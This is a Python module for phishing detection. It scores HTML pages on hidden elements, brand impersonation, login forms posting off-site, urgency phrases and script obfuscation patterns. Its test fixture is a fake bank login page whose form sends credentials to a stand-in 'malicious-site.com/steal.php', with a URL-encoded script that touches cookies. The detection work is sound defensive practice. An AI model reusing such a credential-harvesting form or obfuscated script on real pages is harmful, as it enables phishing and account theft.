"""
Enhanced Content Analysis for Phishing Detection

This module provides advanced HTML content analysis functions that can detect
phishing attempts by examining the structure, quality, and behavior of web pages.
"""

import re
import urllib.parse
import logging
from typing import Dict, List, Any, Tuple, Optional
from urllib.parse import urlparse
import hashlib
import json
import os

# Initialize logger
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class ContentAnalyzer:
    """Advanced content analysis for phishing detection."""
    
    def __init__(self, cache_dir: Optional[str] = None):
        """
        Initialize the content analyzer.
        
        Args:
            cache_dir: Directory to cache results (None for no caching)
        """
        self.common_brands = [
            'paypal', 'apple', 'microsoft', 'amazon', 'facebook', 'google', 
            'chase', 'bank', 'netflix', 'instagram', 'linkedin', 'twitter',
            'outlook', 'office365', 'gmail', 'yahoo', 'bitcoin', 'coinbase',
            'wellsfargo', 'bankofamerica', 'citibank', 'dropbox', 'docusign',
            'adobe', 'amex', 'americanexpress', 'mastercard', 'visa', 'discover'
        ]
        
        self.security_terms = [
            'verify', 'secure', 'authenticate', 'confirm', 'update', 'login',
            'account', 'password', 'credential', 'security', 'validation',
            'verification', 'expire', 'unauthorized', 'suspicious', 'unusual'
        ]
        
        self.login_indicators = [
            'login', 'signin', 'sign-in', 'logon', 'auth', 'credential', 
            'username', 'password', 'email', 'account', 'authenticate'
        ]
        
        self.cache_dir = cache_dir
        if cache_dir and not os.path.exists(cache_dir):
            try:
                os.makedirs(cache_dir)
            except:
                self.cache_dir = None
    
    def analyze_content(self, content: str, url: str) -> Dict[str, Any]:
        """
        Analyze HTML content for phishing indicators.
        
        Args:
            content: HTML content string
            url: Source URL for context
            
        Returns:
            Dictionary with analysis results
        """
        if not content or len(content) < 50:
            return {
                'risk_score': 50,
                'flags': ["Empty or minimal content"],
                'details': {'error': 'Insufficient content for analysis'}
            }
            
        # Check for cached result first
        if self.cache_dir:
            content_hash = hashlib.md5(content.encode()).hexdigest()
            cache_file = os.path.join(self.cache_dir, f"{content_hash}.json")
            
            if os.path.exists(cache_file):
                try:
                    with open(cache_file, 'r') as f:
                        return json.load(f)
                except:
                    pass  # Continue with analysis if cache read fails
        
        # Begin analysis
        analysis = {
            'url': url,
            'risk_score': 0,
            'flags': [],
            'content_metrics': {},
            'dom_analysis': {},
            'security_analysis': {},
            'inconsistencies': [],
            'suspicious_elements': []
        }
        
        try:
            # Import BeautifulSoup
            try:
                from bs4 import BeautifulSoup
                soup = BeautifulSoup(content, 'html.parser')
            except ImportError:
                return {
                    'risk_score': 30,
                    'flags': ["BeautifulSoup library not available for HTML analysis"],
                    'details': {'error': 'Missing dependency'}
                }
            
            # Parse the URL components
            parsed_url = urlparse(url)
            domain = parsed_url.netloc
            if domain.startswith('www.'):
                domain = domain[4:]
            main_domain = '.'.join(domain.split('.')[-2:]) if '.' in domain else domain
            
            # 1. Extract page text and do basic metrics
            page_text = soup.get_text()
            text_length = len(page_text)
            html_length = len(content)
            text_ratio = text_length / max(1, html_length)
            
            analysis['content_metrics'] = {
                'text_length': text_length,
                'html_length': html_length,
                'text_to_html_ratio': text_ratio,
                'element_count': len(soup.find_all())
            }
            
            # Extremely low text-to-HTML ratio can indicate hidden content
            if text_ratio < 0.05 and html_length > 4000:
                analysis['flags'].append("Very low text-to-HTML ratio - possible hidden content")
                analysis['risk_score'] += 15
            
            # 2. Analyze the DOM structure
            dom_analysis = self._analyze_dom_structure(soup, domain)
            analysis['dom_analysis'] = dom_analysis
            analysis['flags'].extend(dom_analysis['flags'])
            analysis['risk_score'] += dom_analysis['risk_score']
            
            # 3. Check for brand mentions
            brand_analysis = self._check_brand_mentions(soup, domain)
            analysis['brand_analysis'] = brand_analysis
            analysis['flags'].extend(brand_analysis['flags'])
            analysis['risk_score'] += brand_analysis['risk_score']
            
            # 4. Analyze forms and inputs
            form_analysis = self._analyze_forms(soup, domain)
            analysis['form_analysis'] = form_analysis
            analysis['flags'].extend(form_analysis['flags'])
            analysis['risk_score'] += form_analysis['risk_score']
            
            # 5. Check for security indicators and phishing language
            security_analysis = self._check_security_terms(page_text, soup, domain)
            analysis['security_analysis'] = security_analysis
            analysis['flags'].extend(security_analysis['flags'])
            analysis['risk_score'] += security_analysis['risk_score']
            
            # 6. Check for inconsistencies
            inconsistencies = self._check_inconsistencies(soup, url)
            analysis['inconsistencies'] = inconsistencies
            if inconsistencies:
                for issue in inconsistencies:
                    analysis['flags'].append(f"Inconsistency: {issue}")
                analysis['risk_score'] += len(inconsistencies) * 10
            
            # 7. Check for obfuscation
            obfuscation_analysis = self._check_obfuscation(soup, content)
            analysis['obfuscation'] = obfuscation_analysis
            analysis['flags'].extend(obfuscation_analysis['flags'])
            analysis['risk_score'] += obfuscation_analysis['risk_score']
            
            # Cap risk score
            analysis['risk_score'] = min(100, analysis['risk_score'])
            
            # Cache the result
            if self.cache_dir:
                try:
                    content_hash = hashlib.md5(content.encode()).hexdigest()
                    cache_file = os.path.join(self.cache_dir, f"{content_hash}.json")
                    with open(cache_file, 'w') as f:
                        json.dump(analysis, f)
                except:
                    pass
                
        except Exception as e:
            logger.error(f"Content analysis error: {str(e)}")
            analysis['flags'].append(f"Analysis error: {str(e)}")
            analysis['risk_score'] = 30  # Moderate risk for analysis failures
        
        return analysis
    
    def _analyze_dom_structure(self, soup, domain: str) -> Dict[str, Any]:
        """Analyze DOM structure for phishing indicators."""
        results = {
            'risk_score': 0,
            'flags': [],
            'hidden_elements': 0,
            'iframe_analysis': {},
            'html_quality': {}
        }
        
        # Check for hidden elements
        hidden_elements = []
        
        # Direct style-based hiding
        style_hidden = soup.select('[style*="display: none"], [style*="display:none"], [style*="visibility: hidden"]')
        hidden_elements.extend(style_hidden)
        
        # Opacity-based hiding
        opacity_hidden = soup.select('[style*="opacity: 0"], [style*="opacity:0"]')
        hidden_elements.extend(opacity_hidden)
        
        # Attribute-based hiding
        attr_hidden = soup.select('[hidden], [aria-hidden="true"]')
        hidden_elements.extend(attr_hidden)
        
        # Off-screen positioning
        offscreen = soup.select('[style*="position: absolute"][style*="left: -"], [style*="position:absolute"][style*="left:-"], [style*="top:-"], [style*="margin:-"]')
        hidden_elements.extend(offscreen)
        
        # Tiny size hiding
        tiny = soup.select('[style*="width: 0"], [style*="width:0"], [style*="height: 0"], [style*="height:0"], [style*="font-size: 0"]')
        hidden_elements.extend(tiny)
        
        # Z-index hiding
        z_index = soup.select('[style*="z-index: -"]')
        hidden_elements.extend(z_index)
        
        # Remove duplicates
        hidden_elements = list(set(hidden_elements))
        results['hidden_elements'] = len(hidden_elements)
        
        # Score based on hidden elements
        if len(hidden_elements) > 0:
            results['flags'].append(f"Found {len(hidden_elements)} hidden elements")
            results['risk_score'] += min(len(hidden_elements) * 5, 20)  # Cap at 20
            
            # Check if hidden elements contain sensitive content
            sensitive_hidden = False
            login_hidden = False
            
            for elem in hidden_elements:
                # Check for password fields
                if elem.find_all('input', {'type': 'password'}):
                    sensitive_hidden = True
                    
                # Check for login-related content
                elem_text = elem.get_text().lower()
                elem_html = str(elem).lower()
                
                if any(term in elem_text or term in elem_html for term in self.login_indicators):
                    login_hidden = True
                    
                # Check attributes for login indicators
                for attr in ['id', 'class', 'name']:
                    attr_val = elem.get(attr, '').lower()
                    if any(term in attr_val for term in self.login_indicators):
                        login_hidden = True
            
            if sensitive_hidden:
                results['flags'].append("Hidden elements contain password fields - highly suspicious")
                results['risk_score'] += 25
                
            if login_hidden:
                results['flags'].append("Hidden elements contain login-related content")
                results['risk_score'] += 15
        
        # Check iframe usage
        iframes = soup.find_all('iframe')
        if iframes:
            iframe_analysis = {
                'count': len(iframes),
                'external_domains': [],
                'suspicious': False
            }
            
            # Analyze each iframe
            for iframe in iframes:
                src = iframe.get('src', '')
                if src and src.startswith(('http://', 'https://')):
                    try:
                        iframe_domain = urlparse(src).netloc
                        if iframe_domain and iframe_domain != domain:
                            iframe_analysis['external_domains'].append(iframe_domain)
                            
                            # Check if iframe source is a common brand domain
                            if any(brand in iframe_domain for brand in self.common_brands):
                                iframe_analysis['suspicious'] = True
                    except:
                        pass
            
            # Score iframe usage
            if iframe_analysis['count'] > 0:
                results['flags'].append(f"Uses {iframe_analysis['count']} iframes")
                results['risk_score'] += min(iframe_analysis['count'] * 5, 15)
                
                if iframe_analysis['external_domains']:
                    domains_str = ', '.join(iframe_analysis['external_domains'][:3])
                    if len(iframe_analysis['external_domains']) > 3:
                        domains_str += f" and {len(iframe_analysis['external_domains']) - 3} more"
                    results['flags'].append(f"Uses iframes from external domains: {domains_str}")
                    results['risk_score'] += 10
                
                if iframe_analysis['suspicious']:
                    results['flags'].append("Suspicious iframe usage with brand domains")
                    results['risk_score'] += 15
            
            results['iframe_analysis'] = iframe_analysis
        
        # Check HTML quality
        html_tag = soup.find('html')
        head_tag = soup.find('head')
        body_tag = soup.find('body')
        
        html_quality = {
            'has_doctype': soup.find('html').parent.name == '[document]' if html_tag else False,
            'has_html_tag': bool(html_tag),
            'has_head_tag': bool(head_tag),
            'has_body_tag': bool(body_tag),
            'has_title': bool(soup.find('title')),
            'broken_links_count': 0
        }
        
        # Check for broken links
        broken_links = 0
        for link in soup.find_all('a'):
            href = link.get('href', '')
            if href == '#' or href == '' or href == 'javascript:void(0)':
                broken_links += 1
        
        html_quality['broken_links_count'] = broken_links
        results['html_quality'] = html_quality
        
        # Score HTML quality
        quality_issues = 0
        if not html_quality['has_doctype']:
            quality_issues += 1
        if not html_quality['has_head_tag']:
            quality_issues += 1
        if not html_quality['has_body_tag']:
            quality_issues += 1
        if not html_quality['has_title']:
            quality_issues += 1
        if broken_links > 5:
            quality_issues += 1
        
        if quality_issues >= 2:
            results['flags'].append(f"Poor HTML quality ({quality_issues} issues)")
            results['risk_score'] += quality_issues * 5
        
        return results
    
    def _check_brand_mentions(self, soup, domain: str) -> Dict[str, Any]:
        """Check for brand mentions and mismatches."""
        results = {
            'risk_score': 0,
            'flags': [],
            'mentioned_brands': [],
            'impersonation_detected': False
        }
        
        # Get text content
        page_text = soup.get_text().lower()
        
        # Check for brand mentions in text, title, meta tags
        mentioned_brands = []
        for brand in self.common_brands:
            if brand in page_text and brand not in domain:
                mentioned_brands.append(brand)
        
        # Check title tag
        title_tag = soup.find('title')
        if title_tag and title_tag.string:
            title_text = title_tag.string.lower()
            for brand in self.common_brands:
                if brand in title_text and brand not in domain and brand not in mentioned_brands:
                    mentioned_brands.append(brand)
        
        # Check meta tags (description, keywords, og:title)
        for meta in soup.find_all('meta'):
            content = meta.get('content', '').lower()
            if not content:
                continue
                
            for brand in self.common_brands:
                if brand in content and brand not in domain and brand not in mentioned_brands:
                    mentioned_brands.append(brand)
        
        results['mentioned_brands'] = mentioned_brands
        
        # Score based on brand mentions
        if mentioned_brands:
            if len(mentioned_brands) == 1:
                brand = mentioned_brands[0]
                results['flags'].append(f"References to {brand} found, but not in domain")
                results['risk_score'] += 10
                
                # Check for clear impersonation attempt
                brand_elements = soup.find_all(string=re.compile(brand, re.IGNORECASE))
                if len(brand_elements) >= 3:  # Multiple mentions
                    results['impersonation_detected'] = True
                    results['flags'].append(f"Possible {brand} impersonation detected")
                    results['risk_score'] += 15
            else:
                # Multiple brands mentioned is very suspicious
                brands_str = ', '.join(mentioned_brands[:3])
                if len(mentioned_brands) > 3:
                    brands_str += f" and {len(mentioned_brands) - 3} more"
                results['flags'].append(f"Multiple brands mentioned: {brands_str}")
                results['risk_score'] += 10 + (len(mentioned_brands) - 1) * 5  # +5 per additional brand
                results['impersonation_detected'] = True
        
        # Check for logos
        images = soup.find_all('img')
        for img in images:
            src = img.get('src', '')
            alt = img.get('alt', '').lower()
            
            # Check alt text for brand names
            for brand in self.common_brands:
                if brand in alt and brand not in domain and brand not in results['mentioned_brands']:
                    results['mentioned_brands'].append(brand)
                    results['flags'].append(f"{brand} logo detected but not in domain name")
                    results['risk_score'] += 10
        
        return results
    
    def _analyze_forms(self, soup, domain: str) -> Dict[str, Any]:
        """Analyze forms for phishing indicators."""
        results = {
            'risk_score': 0,
            'flags': [],
            'forms_count': 0,
            'password_fields': 0,
            'forms_with_external_action': 0,
            'login_forms': 0,
            'suspicious_forms': 0
        }
        
        forms = soup.find_all('form')
        results['forms_count'] = len(forms)
        
        if not forms:
            return results
        
        login_forms = 0
        password_fields = 0
        external_actions = 0
        suspicious_forms = 0
        
        for form in forms:
            form_html = str(form).lower()
            form_id = form.get('id', '').lower()
            form_class = ' '.join(form.get('class', [])).lower()
            form_action = form.get('action', '').lower()
            
            # Count password fields
            pwd_fields = form.find_all('input', {'type': 'password'})
            password_fields += len(pwd_fields)
            
            # Check if this is a login form
            is_login_form = False
            
            # Check form attributes for login indicators
            if any(term in form_id or term in form_class or term in form_action for term in self.login_indicators):
                is_login_form = True
            
            # Check if form has password field
            if pwd_fields:
                is_login_form = True
            
            # Check button text for login indicators
            for button in form.find_all(['button', 'input']):
                btn_text = button.get_text().lower() if hasattr(button, 'get_text') else ''
                btn_value = button.get('value', '').lower()
                btn_id = button.get('id', '').lower()
                btn_class = ' '.join(button.get('class', [])).lower()
                
                if any(term in btn_text or term in btn_value or term in btn_id or term in btn_class 
                       for term in self.login_indicators):
                    is_login_form = True
            
            if is_login_form:
                login_forms += 1
            
            # Check if form action is external
            has_external_action = False
            action = form.get('action', '')
            
            if action and action.startswith(('http://', 'https://')):
                try:
                    action_domain = urlparse(action).netloc
                    if action_domain and action_domain != domain:
                        has_external_action = True
                        external_actions += 1
                except:
                    pass
            
            # Check for other suspicious indicators
            is_suspicious = False
            
            # Hidden username/email fields often indicate phishing
            hidden_user_fields = form.find_all('input', {'type': 'hidden', 'name': re.compile(r'user|email|login|account', re.I)})
            if hidden_user_fields:
                is_suspicious = True
            
            # Excessive hidden fields can be suspicious
            all_hidden_fields = form.find_all('input', {'type': 'hidden'})
            if len(all_hidden_fields) > 5:
                is_suspicious = True
            
            # Autocomplete disabled can be suspicious
            has_autocomplete_off = False
            autocomplete_attrs = [form.get('autocomplete', '')]
            for input_field in form.find_all('input'):
                autocomplete_attrs.append(input_field.get('autocomplete', ''))
            
            if 'off' in autocomplete_attrs:
                has_autocomplete_off = True
            
            # Combination of factors
            if is_login_form and (has_external_action or has_autocomplete_off or is_suspicious):
                suspicious_forms += 1
        
        results.update({
            'password_fields': password_fields,
            'login_forms': login_forms,
            'forms_with_external_action': external_actions,
            'suspicious_forms': suspicious_forms
        })
        
        # Score form analysis
        if login_forms > 0:
            results['flags'].append(f"Found {login_forms} login forms")
            
            if external_actions > 0:
                results['flags'].append(f"Forms submit to external domains")
                results['risk_score'] += 30
                
            if suspicious_forms > 0:
                results['flags'].append(f"Found {suspicious_forms} suspicious forms")
                results['risk_score'] += 20
            
            # Check if page is trying to impersonate a login page
            for brand in self.common_brands:
                if brand in domain:
                    # Brand is in domain, so may be legitimate
                    break
            else:
                # Brand not in domain but has login form - suspicious
                if results.get('password_fields', 0) > 0:
                    results['flags'].append("Login form present but no brand in domain - potential phishing")
                    results['risk_score'] += 15
        
        return results
    
    def _check_security_terms(self, page_text: str, soup, domain: str) -> Dict[str, Any]:
        """Check for security-related language and urgency indicators."""
        results = {
            'risk_score': 0,
            'flags': [],
            'security_terms_count': 0,
            'urgency_indicators': 0,
            'common_phrases': []
        }
        
        # Convert to lowercase for case-insensitive matching
        page_text = page_text.lower()
        
        # Check for security terms
        security_terms_count = 0
        for term in self.security_terms:
            if term in page_text:
                security_terms_count += 1
        
        results['security_terms_count'] = security_terms_count
        
        # Check for urgency language
        urgency_terms = ['urgent', 'immediately', 'alert', 'warning', 'limited time', 
                        'expire', 'suspended', 'blocked', 'unauthorized', '24 hours',
                        'deadline', 'attention required']
        
        urgency_count = 0
        for term in urgency_terms:
            if term in page_text:
                urgency_count += 1
                
        results['urgency_indicators'] = urgency_count
        
        # Check for common phishing phrases
        phishing_phrases = [
            'verify your account', 'confirm your information', 'update your details',
            'unusual activity', 'suspicious login attempt', 'account suspended',
            'account locked', 'security measure', 'limited access', 'restore access',
            'confirm your identity', 'security notification', 'password expired'
        ]
        
        found_phrases = []
        for phrase in phishing_phrases:
            if phrase in page_text:
                found_phrases.append(phrase)
        
        results['common_phrases'] = found_phrases
        
        # Score based on findings
        if security_terms_count > 2:
            results['flags'].append(f"High use of security-related terms ({security_terms_count})")
            results['risk_score'] += min(security_terms_count * 3, 15)  # Cap at 15 points
        
        if urgency_count > 1:
            results['flags'].append(f"Creates sense of urgency ({urgency_count} indicators)")
            results['risk_score'] += min(urgency_count * 5, 20)  # Cap at 20 points
        
        if found_phrases:
            phrase_str = ', '.join([f'"{p}"' for p in found_phrases[:3]])
            if len(found_phrases) > 3:
                phrase_str += f" and {len(found_phrases) - 3} more"
            results['flags'].append(f"Common phishing phrases: {phrase_str}")
            results['risk_score'] += min(len(found_phrases) * 5, 25)  # Cap at 25 points
        
        return results
    
    def _check_inconsistencies(self, soup, url: str) -> List[str]:
        """Check for inconsistencies between visible and actual content."""
        inconsistencies = []
        
        # Parse URL
        parsed_url = urlparse(url)
        visible_domain = parsed_url.netloc
        
        # Check links
        for link in soup.find_all('a'):
            href = link.get('href', '')
            link_text = link.get_text().strip().lower()
            
            # Skip empty links
            if not href or href.startswith('#') or href == 'javascript:void(0)':
                continue
            
            # If link text contains a URL or domain
            domain_pattern = re.compile(r'(?:https?://)?(?:www\.)?([a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)')
            domain_matches = domain_pattern.findall(link_text)
            
            if domain_matches:
                visible_link_domain = domain_matches[0].lower()
                
                # Check if href points to different domain
                if href.startswith(('http://', 'https://')):
                    try:
                        actual_domain = urlparse(href).netloc.lower()
                        if 'www.' in actual_domain:
                            actual_domain = actual_domain.replace('www.', '')
                        
                        if 'www.' in visible_link_domain:
                            visible_link_domain = visible_link_domain.replace('www.', '')
                        
                        # Compare base domains
                        if visible_link_domain not in actual_domain and actual_domain not in visible_link_domain:
                            inconsistencies.append(f"Link text shows '{visible_link_domain}' but points to '{actual_domain}'")
                    except:
                        pass
        
        # Check for misleading favicons (using common brands but different domain)
        favicon_tags = soup.find_all('link', rel=['icon', 'shortcut icon', 'apple-touch-icon'])
        
        for favicon in favicon_tags:
            href = favicon.get('href', '')
            if not href:
                continue
                
            # Check if href contains brand name but domain doesn't
            for brand in self.common_brands:
                if brand in href.lower() and brand not in visible_domain.lower():
                    inconsistencies.append(f"Favicon references {brand} but domain doesn't")
                    break
        
        # Check if displayed URL != actual URL
        display_url_elements = soup.find_all(string=re.compile(r'(?:https?://)?(?:www\.)?([a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+)'))
        
        for element in display_url_elements:
            # Extract displayed URLs from text
            domain_matches = domain_pattern.findall(element.lower())
            for displayed_domain in domain_matches:
                if displayed_domain not in visible_domain and displayed_domain not in self.common_brands:
                    inconsistencies.append(f"Page shows URL '{displayed_domain}' but actual domain is '{visible_domain}'")
        
        return inconsistencies
    
    def _check_obfuscation(self, soup, content: str) -> Dict[str, Any]:
        """Check for code obfuscation techniques."""
        results = {
            'risk_score': 0,
            'flags': [],
            'obfuscation_detected': False,
            'obfuscation_types': []
        }
        
        # Check for script obfuscation
        scripts = soup.find_all('script')
        
        obfuscation_indicators = {
            'encoded_strings': r'(?:unescape\s*\(|String\.fromCharCode|\\x[0-9a-f]{2}|\\u[0-9a-f]{4})',
            'eval_usage': r'eval\s*\(',
            'document_write': r'document\.write\s*\(',
            'excessive_encoding': r'(?:atob\s*\(|btoa\s*\()',
            'url_encoding': r'(?:%[0-9a-f]{2}){3,}',
            'long_strings': r'[\'"][^\'"]{200,}[\'"]'
        }
        
        # Join all script content
        script_content = ' '.join([script.string for script in scripts if script.string])
        
        # Check each indicator
        found_indicators = []
        for indicator_name, pattern in obfuscation_indicators.items():
            if re.search(pattern, script_content, re.IGNORECASE):
                found_indicators.append(indicator_name)
        
        if found_indicators:
            results['obfuscation_detected'] = True
            results['obfuscation_types'] = found_indicators
            
            obf_str = ', '.join(found_indicators)
            results['flags'].append(f"JavaScript obfuscation detected: {obf_str}")
            results['risk_score'] += min(len(found_indicators) * 8, 30)  # Cap at 30 points
        
        # Check for invisible text (text color matches background)
        for element in soup.find_all(style=True):
            style = element.get('style').lower()
            
            # Check for text color matching background color
            bg_color_match = re.search(r'background(?:-color)?:\s*([#0-9a-z]+)', style)
            text_color_match = re.search(r'color:\s*([#0-9a-z]+)', style)
            
            if bg_color_match and text_color_match:
                bg_color = bg_color_match.group(1)
                text_color = text_color_match.group(1)
                
                if bg_color == text_color:
                    results['flags'].append("Text with color matching background detected")
                    results['risk_score'] += 15
                    results['obfuscation_detected'] = True
                    results['obfuscation_types'].append('invisible_text')
        
        # Check for base64 encoded content
        base64_pattern = r'data:(?:text|image)/[a-z]+;base64,[A-Za-z0-9+/=]{100,}'
        if re.search(base64_pattern, content):
            results['flags'].append("Large base64 encoded content found")
            results['risk_score'] += 10
            
            if 'base64_encoded_content' not in results['obfuscation_types']:
                results['obfuscation_types'].append('base64_encoded_content')
                results['obfuscation_detected'] = True
        
        return results

# Usage example
if __name__ == "__main__":
    analyzer = ContentAnalyzer()
    
    # Example HTML for testing
    test_html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Bank Login</title>
    </head>
    <body>
        <h1>Welcome to Your Bank</h1>
        <form action="http://malicious-site.com/steal.php">
            <input type="text" name="username" placeholder="Email">
            <input type="password" name="password" placeholder="Password">
            <button type="submit">Login</button>
        </form>
        <div style="display:none">paypal.com content</div>
        <script>
        document.write(unescape('%3Cscript%3Edocument.cookie%3D%22stolen%3D%22%2Bdocument.cookie%3B%3C%2Fscript%3E'));
        </script>
    </body>
    </html>
    """
    
    result = analyzer.analyze_content(test_html, "http://fake-bank-login.com")
    print("Risk Score:", result['risk_score'])
    print("Flags:")
    for flag in result['flags']:
        print(f"- {flag}")
